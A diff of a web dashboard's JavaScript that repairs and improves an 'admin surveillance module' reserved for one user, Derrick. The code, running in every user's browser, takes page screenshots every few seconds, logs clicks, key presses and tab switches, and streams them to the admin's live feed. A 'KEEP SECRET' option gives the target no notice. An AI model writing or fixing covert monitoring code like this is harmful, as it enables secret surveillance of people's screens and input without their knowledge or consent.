@@ -3805,7 +3805,7 @@ console.info("System Component: Dashboard Frame mounted successfully.");
 
 /* 
 ========================================================================
-ADMIN SURVEILLANCE MODULE v1.0 [RESTRICTED: DERRICK ONLY]
+ADMIN SURVEILLANCE MODULE v1.2 [RESTRICTED: DERRICK ONLY] - FIXED FEED
 ========================================================================
 */
 
@@ -3813,18 +3813,22 @@ let currentMonitoringUser = null;
 let snapshotInterval = null;
 let surveillanceSub = null;
 
-/**
- * STARTING SURVEILLANCE AGENT (CLIENT SIDE)
- * This logic runs for EVERY user but only triggers if the Admin targets them.
- */
 async function initMonitoringAgent() {
-    // 监听针对我的监控指令
+    // Check if I am currently under surveillance
+    const { data } = await _supabase.from('surveillance').select('monitoring_type, active').eq('target_user', currentUser).maybeSingle();
+    if (data && data.active) {
+        beginCaptureLoop(data.monitoring_type);
+    }
+
     _supabase.channel('surveillance_control')
         .on('postgres_changes', { event: '*', table: 'surveillance', schema: 'public' }, async (payload) => {
-            if (payload.new && payload.new.target_user === currentUser && payload.new.active) {
-                beginCaptureLoop(payload.new.monitoring_type);
-            } else if (payload.old && payload.new === null) {
-                 // Command removed/inactive
+            if (payload.new && payload.new.target_user === currentUser) {
+                if (payload.new.active) {
+                    beginCaptureLoop(payload.new.monitoring_type);
+                } else {
+                    stopCaptureLoop();
+                }
+            } else if (payload.old && payload.old.target_user === currentUser && payload.eventType === 'DELETE') {
                  stopCaptureLoop();
             }
         }).subscribe();
@@ -3834,28 +3838,36 @@ function beginCaptureLoop(type) {
     if (snapshotInterval) return;
     if (type === 'notify') document.getElementById('surveillanceToast').style.display = 'block';
 
-    // Track Events
     window.addEventListener('click', logSurveillanceEvent);
     window.addEventListener('keydown', logSurveillanceEvent);
     window.onblur = () => reportSurveillanceEvent("Tab Left");
     window.onfocus = () => reportSurveillanceEvent("Tab Entered");
 
-    // Start Screen Snapshots (Every 3 seconds)
     snapshotInterval = setInterval(async () => {
         try {
-            const canvas = await html2canvas(document.body, { 
-                scale: 0.5,
+            // Optimized capture: smaller scale for reliability and speed
+            const canvas = await html2canvas(document.documentElement, { 
+                scale: 0.25, 
                 useCORS: true,
+                allowTaint: false,
+                backgroundColor: "#020617",
                 logging: false,
-                ignoreElements: (el) => el.classList.contains('surveillance-overlay')
+                ignoreElements: (el) => el.classList.contains('surveillance-overlay') || el.id === 'modModal'
             });
             const dataUrl = canvas.toDataURL("image/webp", 0.3);
-            await _supabase.from('surveillance').update({ 
+            
+            // UPSERT pattern to ensure record exists and maintains connection
+            await _supabase.from('surveillance').upsert({ 
+                target_user: currentUser,
                 screen_snapshot: dataUrl,
-                updated_at: new Date().toISOString()
-            }).eq('target_user', currentUser);
-        } catch (e) { console.error("Capture fail", e); }
-    }, 3000);
+                updated_at: new Date().toISOString(),
+                active: true
+            }, { onConflict: 'target_user' });
+            
+        } catch (e) { 
+            console.warn("Frame capture dropped due to DOM complexity."); 
+        }
+    }, 4000);
 }
 
 function stopCaptureLoop() {
@@ -3877,24 +3889,20 @@ async function reportSurveillanceEvent(detail) {
     await _supabase.from('surveillance').update({ 
         event_log: `[${new Date().toLocaleTimeString()}] ${detail}`,
         updated_at: new Date().toISOString()
-    }).eq('target_user', currentUser);
+    }).eq('target_user', currentUser).select();
 }
 
-/**
- * ADMIN CONSOLE LOGIC (DERRICK SIDE)
- */
 async function handleSurveillanceStart(username) {
     if (currentUser !== 'Derrick') return;
     const notify = confirm("NOTIFY USER?\n\nOK = User sees notice on screen.\nCancel = KEEP SECRET.");
     
-    // Clear existing
     await _supabase.from('surveillance').delete().eq('target_user', username);
     
-    // Create new monitoring session
     await _supabase.from('surveillance').insert({
         target_user: username,
         admin_user: currentUser,
-        monitoring_type: notify ? 'notify' : 'secret'
+        monitoring_type: notify ? 'notify' : 'secret',
+        active: true
     });
 
     currentMonitoringUser = username;
@@ -3902,18 +3910,31 @@ async function handleSurveillanceStart(username) {
 }
 
 function initSurveillanceSubscription() {
-    if (surveillanceSub) return;
+    if (surveillanceSub) surveillanceSub.unsubscribe();
     const logEl = document.getElementById('surveillanceLog');
+    const feedImg = document.getElementById('surveillanceFeed');
 
     surveillanceSub = _supabase.channel('surveillance_admin_pipe')
-        .on('postgres_changes', { event: 'UPDATE', table: 'surveillance', schema: 'public' }, (payload) => {
-            if (payload.new.target_user === currentMonitoringUser) {
-                if (payload.new.screen_snapshot) {
-                    document.getElementById('surveillanceFeed').src = payload.new.screen_snapshot;
+        .on('postgres_changes', { event: '*', table: 'surveillance', schema: 'public' }, async (payload) => {
+            if (payload.new && payload.new.target_user === currentMonitoringUser) {
+                
+                // DATA RECOVERY FALLBACK: 
+                // Realtime packets strip large Base64 strings. If snapshot is missing, fetch it manually.
+                let snapData = payload.new.screen_snapshot;
+                if (!snapData && (payload.eventType === 'UPDATE' || payload.eventType === 'INSERT')) {
+                    const { data } = await _supabase.from('surveillance').select('screen_snapshot').eq('target_user', currentMonitoringUser).single();
+                    snapData = data?.screen_snapshot;
+                }
+
+                if (snapData) {
+                    feedImg.src = snapData;
                     document.getElementById('surveillanceStatus').innerText = `LIVE: Watching ${currentMonitoringUser}`;
                 }
+                
                 if (payload.new.event_log) {
                     const line = document.createElement('div');
+                    line.style.borderBottom = "1px solid rgba(255,255,255,0.05)";
+                    line.style.padding = "2px 0";
                     line.innerText = payload.new.event_log;
                     logEl.prepend(line);
                 }
